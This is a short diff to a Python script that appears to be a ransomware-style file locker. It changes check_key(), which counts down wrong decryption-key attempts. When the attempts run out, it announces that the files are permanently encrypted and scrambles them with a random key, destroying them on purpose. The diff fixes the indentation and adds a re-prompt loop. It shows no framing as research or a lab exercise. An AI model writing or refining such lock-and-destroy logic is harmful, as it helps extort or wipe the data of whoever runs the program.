@@ -53,11 +53,14 @@ def decrypt_files(files, key, alphabet):
 def check_key(key, right_key, attempts, alphabet):
     if key != right_key:
         if not attempts == "infinite":
-             attempts = int(attempts) - 1
-        if int(attempts) == 0:
-            print("Wrong input, files have been permanently encrypted")
-            key = ''.join(random.sample(alphabet, len(alphabet)))
-            decrypt_files(files, key, alphabet)
+            attempts = int(attempts) - 1
+            if int(attempts) == 0:
+                print("Wrong input, files have been permanently encrypted")
+                key = ''.join(random.sample(alphabet, len(alphabet)))
+                decrypt_files(files, key, alphabet)
+            else:
+                print(f"Wrong input, {attempts} attempts left")
+                check_key(input("Please enter the decryption key:\n") + "\n" + input(""), right_key, attempts, alphabet)
         else:
             print(f"Wrong input, {attempts} attempts left")
             check_key(input("Please enter the decryption key:\n") + "\n" + input(""), right_key, attempts, alphabet)
